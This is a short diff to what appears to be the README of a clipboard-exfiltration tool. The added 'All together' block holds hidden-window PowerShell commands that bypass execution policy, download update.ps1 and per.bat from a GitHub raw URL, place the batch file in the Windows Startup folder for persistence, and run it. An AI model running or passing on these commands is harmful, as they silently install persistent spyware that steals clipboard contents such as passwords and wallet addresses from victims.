@@ -9,3 +9,15 @@ Then save the bat file into startup programs
 Then run the bat file for the first time
 
     Invoke-Expression -Command "& '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\per.bat'" 
+
+
+
+
+All together
+
+```
+powershell -w h -NoP -NonI -Ep Bypass 'Invoke-WebRequest -Uri "https://raw.githubusercontent.com/offport/ClipbpardExfiltration/main/update.ps1" -OutFile "$env:userprofile\AppData\Roaming\update.ps1" -UseBasicParsing'
+powershell -w h -NoP -NonI -Ep Bypass 'Invoke-WebRequest -Uri "https://raw.githubusercontent.com/offport/ClipbpardExfiltration/main/per.bat" -OutFile "$env:APPDATA\Microsoft\Windows\Start` Menu\Programs\Startup\per.bat" -UseBasicParsing'
+Invoke-Expression -Command "& '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\per.bat'" 
+
+```
